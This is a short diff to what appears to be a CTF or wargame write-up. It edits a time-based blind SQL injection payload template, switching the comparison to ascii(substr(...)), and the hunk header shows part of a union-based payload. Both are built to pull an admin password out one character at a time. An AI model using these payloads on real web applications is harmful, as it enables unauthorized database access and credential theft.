@@ -704,5 +704,5 @@ payload = 'or id = 'admin' and (select 1 union select ord(substr({pw},{i},1))={j
 ?>
 ```
 
-payload = if({col} = "admin" and substr({pw},{i},1)="{j}", sleep(2) , (select {col}))
+payload = if({col} = "admin" and ascii(substr({pw},{i},1))="{j}", sleep(2) , (select {col}))
 
